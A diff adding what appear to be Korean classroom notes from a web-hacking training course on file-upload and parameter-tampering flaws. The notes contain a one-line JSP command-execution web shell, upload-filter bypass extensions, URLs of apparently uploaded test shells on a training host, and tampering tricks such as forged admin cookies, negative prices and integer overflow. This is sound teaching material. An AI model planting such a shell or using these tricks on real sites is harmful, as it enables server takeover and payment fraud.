@@ -1,0 +1,196 @@
+https://elms1.skinfosec.co.kr:8090/data/
+
+https://elms1.skinfosec.co.kr:8090/data/files/qna/20240621/59ba1e8e-e7a4-4f57-926d-7f3edaf7fa17 V
+https://elms1.skinfosec.co.kr:8090/files/qna/20240621/752ab139-7245-4603-b2f9-8b6c96ec2a7b.jsp
+https://elms1.skinfosec.co.kr:8090/data/files/qna/20240621/test.jsp
+https://elms1.skinfosec.co.kr:8090/files/qna/20240621/test.jsp
+https://elms1.skinfosec.co.kr:8082/community23/qna/files/qna/20240621/test
+https://elms1.skinfosec.co.kr:8082/community23/files/qna/20240621/test.jsp
+https://elms1.skinfosec.co.kr:8082/files/qna/20240621/test.jsp
+
+
+cmd.exe /c 
+
+Linux
+ls, cat
+
+
+
+	
+	
+<%	Process	p = Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+	
+
+test.jsp
+test.php
+test1.jsp
+test.txt
+test
+test.jsp.bak
+test.jsp.old
+main_backup.jsp
+
+.php .php3 .php5 .php7 .php9 phtml html htm
+asp aspw aspv aspx ..  html htm
+
+
+test.jsp -> 321o0942049-qewfweoi-qefwjkl-qwelfj
+
+file
+====================================
+test.jsp    321o0942049-qewfweoi-qefwjkl-qwelfj
+
+node.js express 파일업다운로드 모듈
+
+
+* 파라미터 변조
+
+- 우리가 지금껏 해왔던 전부가 파라미터 변조
+
+?keyword=
+
+개발자가 의도하지 않은 값을 입력을 해서
+의도치 않게 기능을 작동시키는 모든 것
+
+검색기능 -> 검색어만 넣겠지... <- 예외처리를 X
+
+                             asdf
+pppp@pppp.com ->             [  loginID : pppp          ]
+
+test.com/member/changePassword.jsp?newpass=1234
+
+test.scom/board/write?board=qna&title=제목&content=내용
+test.com/notice/write/ ->
+
+게시판 삼성증권  ->    삼성증권의 (내부망) 다른 게시판 -> 파일업로드   filename
+
+<!---
+
+   
+
+첨부파일
+
+제목 [     ]
+내용 [     ]
+[작성]
+
+samsungpop.com/board/write
+
+name="title"
+
+입력값
+========================
+name="content"
+
+내용
+========================
+name="filename" filename="test.jsp"
+
+<%lksdfjlkdjsfalk
+
+
+updateGetAuth?loginID=사용자&adminYn=2
+
+cookie:sessionid=asdf;role=admin
+
+
+asdf 
+[ 권한 : user              ]
+
+
+
+2차인증 -> 가입 -> 휴대폰
+SMS 213414 입력하세요.
+
+[       ] 인증번호
+
+1. 불충분한 이용자 인증 
+2. 불충분한 이용자 인가
+
+
+
+인증정보 재사용 - 세션재사용
+                - 인증토큰,jwt의 일회성, 탈취해서 다시쓰는거, 유추가 가능한거
+                - 2차인증의 인증값 : 412325<-   해커 똑같은 전화번호 입력해서 문자 : 
+
+-100000000000000000
+
+   if 0< 입력값 < 100000:
+    실행해
+   else:
+    10만원이 넘었습니다.
+
+  계좌 - (-10000000000000000) 입력값 + 포인트 -> 잔액
+
+
+  -> 
+
+  0 ~ 42억
+  unsigned int
+  
+
+
+
+42000000000000000000000
+
+4.2*10^22
+
+
+
+* 파라미터 변조 문제 2번
+
+1. 어떻게 풀었는지
+2. 정답
+
+
+DM 보내주세요.
+
+
+######### 명예의 전당 ########### 조기퇴근자
+***** 신*수 *****    ***** 류*원 *****
+***** 상*후 *****    ***** 유*훈 *****
+***** 양*찬 *****    ***** 정*성 *****
+***** 조*인 *****    ***** 노*기 *****
+***** 한*경 *****    ***** 서*란 *****
+
+* 쇼핑몰 문제 4번
+         
+1. 어떻게 풀었는 지
+2. 정답
+
+DM 보내주세요.      
+
+* 웹 파라미터변조 4번
+박혀있는 비밀번호 무시하고
+'느슨한비교'로 푸는 문제입니다.
+비밀번호 asdfaffwfeeff 로 로그인하는거 아니에요~
+응답값 수정하는거 아닙니다~
+
+
+test.com/board/write?board=lklkjljjkil
+
+/qna/deletebyid?id=9164
+
+/notice/deletebyid?id=3752
+
+
+price1=0&price2=0
+point=0&usepoint=0&&shipmentfee=0&totalprice=0
+
+상품가격 + (-999999) - 할인가 = 결제금액
+
+배송비 : -358900
+
+
+
+* 파라미터 변조
+당연하다 -> 이 당연한 것 조차 검증 -> 서버
+요청, 응답 값에 대해서 
+적절한 값이 들어오고 나가는지에 대한 모든 경우의 수를 검증
+예외처리
+
+불충분한 이용자 인증
+불충분한 이용자 인가
+
+* E2EE End to End Encryption
+* Javascript 
